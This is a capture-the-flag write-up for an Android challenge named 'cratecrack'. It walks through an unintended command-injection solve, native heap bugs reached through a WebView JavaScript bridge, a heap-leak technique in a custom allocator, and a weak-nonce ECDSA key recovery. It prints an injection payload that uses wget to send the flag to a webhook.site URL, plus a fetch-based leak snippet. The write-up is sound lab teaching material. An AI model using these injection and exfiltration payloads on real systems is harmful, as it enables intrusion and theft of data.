+++
title = "cratecrack"
date = 2025-07-08
authors = ["Hargun Kaur"]
+++

Special mention to [this writeup](https://ctftime.org/writeup/40314) by [s41nt0l3xus](https://ctftime.org/user/161414) from team [LCD](https://ctftime.org/team/270230).

### What We're Given

The handout.zip contains an APK file, a python script, a couple of files for a Docker setup, and a placeholder flag.

### The Python Script

Let's begin by going through script.py.

For the PoW, we used Baby-Step Giant-Step algorithm to solve the discrete logarithm problem g^x ≡ target (mod p) for x in the range \[0, max_x\).

```
from math import isqrt
from collections import defaultdict

def bsgs(g, target, p, max_x):
    m = isqrt(max_x) + 1
    baby_steps = {}

    # Baby step: g^j mod p
    current = 1
    for j in range(m):
        if current not in baby_steps:
            baby_steps[current] = j
        current = (current * g) % p

    # Compute g^(-m) mod p
    g_inv = pow(g, -m, p)  # modular inverse
    current = target

    # Giant step: target * g^(-im)
    for i in range(m):
        if current in baby_steps:
            return i * m + baby_steps[current]
        current = (current * g_inv) % p

    return None
```

The script configures environment variables for the Android tools.

```python
adb_port = 11000
emu_port = 11001
home = "/home/user"
apk_path = "/chall/app.apk"

ENV = {}
output = ["This playlist is so bad, my ears filed a complaint.", "If silence had a score, this would still rank lower", "Okay, one decent song. Did you add it by accident?"]

def set_ENV(env):
    env.update(os.environ)
    env.update({
        "ANDROID_ADB_SERVER_PORT" : f"{adb_port}",
        "ANDROID_SERIAL": f"emulator-{emu_port}",
        "ANDROID_SDK_ROOT": "/opt/android/sdk",
        "ANDROID_SDK_HOME": home,
        "ANDROID_PREFS_ROOT": home,
        "ANDROID_EMULATOR_HOME": f"{home}/.android",
        "ANDROID_AVD_HOME": f"{home}/.android/avd",
        "JAVA_HOME": "/usr/lib/jvm/java-17-openjdk-amd64",
        "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "")
    })
```

An AVD (Android Virtual Device) is created and an emulator is started.

```python
def set_EMULATOR():
    subprocess.call(
        "avdmanager" +
        " create avd" +
        " --name 'Pixel_4_XL'" +
        " --abi 'default/x86_64'" +
        " --package 'system-images;android-30;default;x86_64'" +
        " --device pixel_4_xl" +
        " --force"+
        " > /dev/null 2> /dev/null",
        env=ENV,close_fds=True,shell=True)

    return subprocess.Popen(
        "emulator" +
        " -avd Pixel_4_XL" +
        " -no-cache" +
        " -no-snapstorage" +
        " -no-snapshot-save" +
        " -no-snapshot-load" +
        " -no-audio" +
        " -no-window" +
        " -no-snapshot" +
        " -no-boot-anim" +
        " -wipe-data" +
        " -accel on" +
        " -netdelay none" +
        " -netspeed full" +
        " -delay-adb" +
        " -port {}".format(emu_port)+
        " > /dev/null 2> /dev/null ",
        env=ENV,close_fds=True,shell=True)
```

We won't get into the details of this set up, but we will save it for later use since these shell commands will help us run Android on our own.

```python
def ADB_Helper(args,var1=True):
    return subprocess.run("adb {}".format(" ".join(args)),env=ENV,shell=True,close_fds=True,capture_output=var1).stdout

def install_apk():
    ADB_Helper(["install","-r",apk_path])

def start_activity():
    ADB_Helper(["shell","am","start","-n","bi0sctf.challenge/.MainActivity"])

# def start_broadcast(action,extras=None):
#     ADB_Helper(["shell", "am", "broadcast", "-a", action, '--es', 'url',extras['url']])

def send_url(extras=None):
    ADB_Helper(["shell","am","start","-n","bi0sctf.challenge/.MainActivity","--es","url",extras['url']])

def print_adb_logs():
     logs = ADB_Helper(["logcat", "-d"])
     for log in logs.decode("utf-8").strip().split("\n"):
         print(log)

def push_file():
    ADB_Helper(["root"])
    ADB_Helper(["push", "/chall/flag", "/data/data/bi0sctf.challenge/"])
    ADB_Helper(["unroot"])
```

These are helper functions for ADB (Android Debug Bridge) which is a command-line tool that lets us communicate with the emulated device.

Finally, the main logic:

```python
try:
    set_ENV(ENV)
    print_prompt("+-------------------=============-------------------+")
    print_prompt("+------------------ Playlist Checker ---------------+")
    print_prompt("+-------------------=============-------------------+")
    print_prompt("[+] Waking up the bot to analyze your secret playlist...")
    emulator = set_EMULATOR()
    #print_adb_logs()
    ADB_Helper(["wait-for-device"])

    print_prompt("[+] Stats: Recommended over 100 playlists today.")
    install_apk()

    print_prompt("[+] Status: Starting the analysing engine.")
    start_activity()
    push_file()

    time.sleep(5)

    print_prompt("[+] Enter your Playlist URL to analyze: ")
    input_url = sys.stdin.readline().strip()
    # start_broadcast("bi0sctf.android.DATA", extras = {"url": input_url})

    send_url(extras={'url':input_url})

    reply = output[randint(0, 2)]
    print_prompt("[+] Opinion: " + reply)

    time.sleep(10)

    os.system("kill -9 `pgrep qemu`")
    emulator.kill()
except:
    print("nice try kid")
    os.system("kill -9 `pgrep qemu`")
    os.system("kill -9 `pgrep adb`")
    emulator.kill()
```

The script starts the emulator and installs the APK file on the virtual device. The application runs and accepts the url input from the user.

### Unintended Solve

Notice the OS command injection vulnerability via the unsanitised input for user-controlled url parameter. We can exploit shell=True in subprocess.run() by injecting ; to run extra commands.

Payload:

- `; cd /chall`

 Break out of the original command
 Change directory to where the flag is stored

- `wget "https://webhook.site/... ?message=$(...)”`

 Sending flag as an HTTP request parameter to a controlled webhook.site URL.
 Command substitution executes below command and replaces itself with the flag text in the command line

- `LC_ALL=C grep -r 'bi0sctf{'`

 Find lines containing `bi0sctf{}`

For the sake of the writeup and our understanding, let's move forward with the intended solution.

### Decompiling APK

We can look into app.apk using a tool like [JADX](https://github.com/skylot/jadx).

### MainActivity

As per the ADB helper functions used in the main logic of script.py, `bi0sctf.challenge.MainActivity` seems to be the entry point of the application. Let's begin there.

```java
package bi0sctf.challenge;

import android.os.Bundle;
import android.webkit.JavascriptInterface;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    public native long addNote(byte[] bArr);

    public native void deleteNote(long j);

    public native void edit(byte[] bArr, long j);

    public native void encryption();

    public native String getContent(long j);

    public native String getId(long j);

    public native void whiplash(MainActivity mainActivity);

    static {
        System.loadLibrary("supernova");
        System.loadLibrary("bob");
    }
```

Methods marked as `native` are implemented in native (x86_64) code via shared libraries. For example, there are two native libraries loaded here - `bob` and `supernova`.

```java
    @JavascriptInterface
    public long secure_addNote(byte[] bArr) {
        return addNote(bArr);
    }

    @JavascriptInterface
    public void secure_deleteNote(long j) {
        deleteNote(j);
    }

    @JavascriptInterface
    public void secure_edit(byte[] bArr, long j) {
        edit(bArr, j);
    }

    @JavascriptInterface
    public String secure_getContent(long j) {
        return getContent(j);
    }

    @JavascriptInterface
    public String secure_getId(long j) {
        return getId(j);
    }

    @JavascriptInterface
    public void secure_encryption() {
        encryption();
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        whiplash(this);
    }
}
```

Since the application processes URLs, we can assume that the methods marked with `@JavascriptInterface` can be triggered by JavaScript on a web page loaded from our URL.

The native method `whiplash` seems to handle the app’s startup logic, as we find out in the next section.

We can now look at the native libraries in the Ghidra decompiler to search for functions implementing native Java methods.

### libbob

This is implemented in native Rust, using JNI calls. `Java_bi0sctf_challenge_MainActivity_whiplash` is the only native method in this library.

- It gets the Activity's Intent.
- Extracts the "url" extra from the Intent.
- Sets the layout (setContentView).
- Finds a WebView by ID.
- Enables JavaScript and sets cache mode.
- Adds a JavascriptInterface object. Registering a JavaScript bridge called "aespa"
- Sets WebViewClient and WebChromeClient.
- Loads the URL into the WebView.

### libsupernova

The supernova library contains the native methods for a note management system which were mentioned earlier in the MainActivity.

#### addNote

Let's begin with the `addNote` method.

```c
long Java_bi0sctf_challenge_MainActivity_addNote
               (long *param_1,undefined8 param_2,undefined8 param_3)

{
  char *note_bytes;
  size_t note_len;
  undefined8 note;
  long new_size;
  
  new_size = -1;
  if (noteBook_size != 10) {
    note_bytes = (char *)(**(code **)(*param_1 + 0x5c0))(param_1,param_3,0);
    note_len = strlen(note_bytes);
    if (note_len < 0x20) {
      note_len = strlen(note_bytes);
      note = talloc(note_len & 0xffffffff,note_bytes);
      *(undefined8 *)(noteBook + noteBook_size * 8) = note;
      new_size = noteBook_size;
      noteBook_size = noteBook_size + 1;
    }
  }
  return new_size;
}
```

The buffer for storing `note` is allocated with `talloc`, a custom allocator similar to the one in the 2024 bi0s CTF challenge Tallocator.

The notebook may have upto 10 notes. Input bytes up to note_len are copied, but not more than 0x1F bytes i.e. maximum note length is 31 bytes.

#### edit

Below is the `edit` method which copies new bytes over the previous note bytes. Observe that there is no size comparison between new and existing note bytes.

```c

void Java_bi0sctf_challenge_MainActivity_edit
               (long *param_1,undefined8 param_2,char *new_note_obj,long note_id)

{
  void *__dest;
  long lVar1;
  size_t note_len;
  char *__s;
  
  if ((note_id < 10) && (note_len = strlen(new_note_obj), note_len < 0x20)) {
    __s = (char *)(**(code **)(*param_1 + 0x5c0))(param_1,new_note_obj,0);
    __dest = *(void **)(noteBook + note_id * 8);
    note_len = strlen(__s);
    memcpy(__dest,__s,note_len);
    note_len = strlen(__s);
    if (note_len < 0x20) {
      lVar1 = *(long *)(noteBook + note_id * 8);
      note_len = strlen(__s);
      *(undefined1 *)(lVar1 + note_len) = 0;
    }
  }
  return;
}
```

Since the `edit` method copies input until its note_len, we need a strategy to write zeroes to the note buffer. To do this:

- Create a copy of the note and replace all zero values with some placeholder, say 0xFF
- Write this copy to the note buffer using `edit` method
- Locate index of the last occurrence of zero in the original note
- Slice the modified copy until this index and replace last placeholder with a zero. Write this to buffer
- To avoid rewriting the same zero, change it in the original (track this separately)
- Repeat this process until the entire note is covered.

#### getId

Here is the `getId` method.

```c
char * Java_bi0sctf_challenge_MainActivity_getId(long *param_1,undefined8 param_2,long noteId)

{
  char *pcVar1;
  long in_FS_OFFSET;
  undefined1 auStack_38 [32];
  long local_18;
  
  local_18 = *(long *)(in_FS_OFFSET + 0x28);
  if (noteId < 10) {
    FUN_00103050(auStack_38,param_2,noteId,*(undefined8 *)(*(long *)(noteBook + noteId * 8) + 0x20 ))
    ;
    pcVar1 = (char *)(**(code **)(*param_1 + 0x538))(param_1,auStack_38);
  }
  else {
    pcVar1 = "Nice Try";
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == local_18) {
    return pcVar1;
  }
  __stack_chk_fail();
}
```

It takes a noteId, checks if it's <10, and retrieves an associated ID string from a native note structure, returning it as a Java string. Otherwise, it returns "Nice Try". However, since the note size is limited to 0x1F bytes, reading a value (an 0x08-byte qword) at an offset of 0x20 bytes from the note start is an out-of-bounds read vulnerability.

#### deleteNote

The final note-related method we'll discuss is `deleteNote`.

```c

void Java_bi0sctf_challenge_MainActivity_deleteNote
               (undefined8 param_1,undefined8 param_2,long note_id)

{
  if (note_id < 10) {
    tree(*(undefined8 *)(noteBook + note_id * 8));
    noteBook_size = noteBook_size + -1;
  }
  return;
}

```

We assume that the `tree` function is the free counterpart to the `talloc` allocator.
Observe that the note pointer is not set to NULL after being freed i.e. use-after-free vulnerability.

#### encryption

The last `encryption` method leads us to the `trigger_encryption` function that carries out the following logic:

- Only allows function to run once.
- Generate 32 bytes of randomness from /dev/urandom
- Hash two hard-coded strings with SHA-256
- Create two ECDSA signatures with secp256k1.
- Serialize signatures in compact form
- Generate a public key.
- Verify the signatures.
- Prepare flag plaintext with padding
- Derive AES key and IV from previous random key.
- AES-128-CBC encryption.
- Serialize the public key.
- Store signatures, ciphertext and sigining public key with `talloc` (pointers not stored)

## Tallocator

Since there is no read functionality for our notes, we cannot abuse use-after-free by reusing them to access `trigger_encryption` output. We now look at `talloc` source code from `libsupernova.so` to explore alternate tactics.

We can refer [source code](https://github.com/teambi0s/bi0sCTF/blob/main/2024/Pwn/tallocator/admin/src/tallocator.c) from the 2024 bi0s CTF challenge Tallocator. Note that there is no `runDebug` logic and no RWX page for RCE exploitation in this version.

We can see that `talloc` mimics `malloc` behaviour, using doubly linked free lists and metadata stored near memory chunks.

Heap structure is as follows:

- Allocations are 16-byte aligned.
- Each chunk stores:
  - `SIZE` just before the chunk pointer.
  - `FWD` and `BKD` pointers (first two qwords of the chunk) for doubly linked list navigation.
- Two free lists:
  - Short list for small chunks.
  - Long list for large chunks.

`talloc` initializes by setting `HeapStart` with `sbrk`, defining a top chunk at `HeapStart + 0x38` for extra allocations. When allocating, it aligns the size (minimum 0x20), first tries the short free list, then the long one, and falls back to the top chunk if needed. It includes checks to avoid reallocating in-use chunks and to ensure only valid frees are accepted.

Insights:

- Since we can write up to 0x20 bytes into a freed chunk, we can manipulate FWD and BKD pointers.
- This could potentially force `talloc` to return a controlled address
- However, ASLR is enabled, so we need a leak to proceed with such a attack.

## Setting Up

### Docker

Use the given [Dockerfile from the handout with some alterations](https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/Dockerfile):

- add `ndk-bundle` to list of packages installed by `sdkmanager` to get `gdbserver` binary needed for debugging later
- change container's `CMD` to run [start.sh](https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/start.sh) instead of `socat`

Start the container from this image with [docker.sh](https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/docker.sh).

### Android

Using bits from the given script.py we do the following

- set up env variables
- start emulator
- install apk
- start application and send a url
- view app logs

### Debugger

- copy the `gdbserver` binary onto the device
- make it executable
- adjust Android default security features
  - get root adb
  - make /system writeable
  - stop SELinux from blocking
  - unlock perf counters
- attach `gdbserver` to process
- connect to gdb from host

Compile above command sequences into one [helper](https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/Handout/helper) script for convenience:

### bob, wya?

To debug code inside libbob.so we need its address. We can't use `/proc/<pid>/maps` because it doesn’t appear by name since it was loaded as a memory-mapped segment of the APK itself.

Instead, we identify which mapping line in `/proc/<pid>/maps`corresponds to the desired library by checking the address pattern and the `base.apk` path.

Following shell command automates this extraction for further  exploitation

```
adb shell 'grep -E "00880000.*base.apk" /proc/$(pidof -s bi0sctf.challenge)/maps | grep -oE "^[^-]*"'
```

### @JavaScriptInterface

Set up a simple web server.

```
python3 -m http.server 14444
```

Send the url `http://<IP>:14444/exploit.html` where `exploit.html` is the file with the exploit.

To use the same server for transfer of leaked data back to us, include the following function in the exploit script.

```
function exploit()
{
  console.log("exploit");
  let leak = "leaked";
  fetch("/" + leak);
}
```

This enables us to see leaks in the web server logs.

## Exploitation

### A Few More Functions

Implement the following JS functions to intract with `libbob.so`.

```JavaScript
function add(arr) {
  return aespa.secure_addNote(arr);
}

function edit(idx, arr) {
  return aespa.secure_edit(arr, idx);
}

function delete(idx) {
  return aespa.secure_deleteNote(idx);
}

function read(idx) {
  return aespa.secure_getId(idx);
}

function encrypt() {
  return aespa.secure_encryption()
}
```

We can also set up some helper functions
 `sleep()` - blocking delay
 `hex()` - print hex
 `pack()` - BigInt to 8-byte array

### Heap Address Leak

Recall that small `talloc` chunks have 8 bytes metadata and 24 bytes for use. `getId` reads 8 bytes at an offset of `0x20`, which leaks the `FWD` pointer of the next freed chunk. Thus, we can free two chunks and read one to get the other's address.

### The BibaBoba Algo

(Btw I am very fond of these names. Good time to acknowledge [this very nice writeup](https://ctftime.org/writeup/40314) again)

1. Allocate Biba
2. Allocate Boba (size is 0x20 bytes)
3. Trigger  encryption so its output lands right after Boba in memory
4. Use Boba to leak the first 8 bytes (qword) of the target data
5. Write the fake chunk  into Boba’s usable space (note)
6. Free Biba!
7. Overwrite Biba’s FWD pointer to point to the fake chunk inside Boba.
8. Allocate Biba again (it comes back first from the free list).
9. Allocate the fake chunk (which now points to the next target data).
10. Make the new fake chunk the new Boba.
11. Repeat from step 4 until we read till needed.

Running the [code](https://github.com/s41nt0l3xus/CTF-writeups/blob/master/bi0sctf-2025/cratecrack/task/exploit.html) that implements this strategy sends us the leak to the previously set-up web server.

## Crypto

Normally, ECDSA security depends on using a secret, random, one-time nonce per signature. ECDSA is secure only if the nonce is unpredictable and used once. But in this implementation, the nonce is deterministically constructed i.e. they are predictable.

An ECDSA signature leaks info about the nonce via its $s$ component:
$$s = \frac{z + r·d}{k}   \mod n$$

We have two signatures $s1$ and $s2$ that both use nonces of the form $k_i = (X << 128) + m_i$ where $m_i$ is derived from message hash.

$s1, s2$ depend on the same secret $X$ (the upper half of the nonce), but with different known lower halves.

This makes it possible to set up two linear equations. By solving these modular equations, one can recover $X$ and then compute $d$ (private-key).

Lastly, the flag is encrypted with AES using:
 Key = SHA256(private-key)
 IV = first 16 bytes of private-key
Hence, we can finally decrypt the flag!

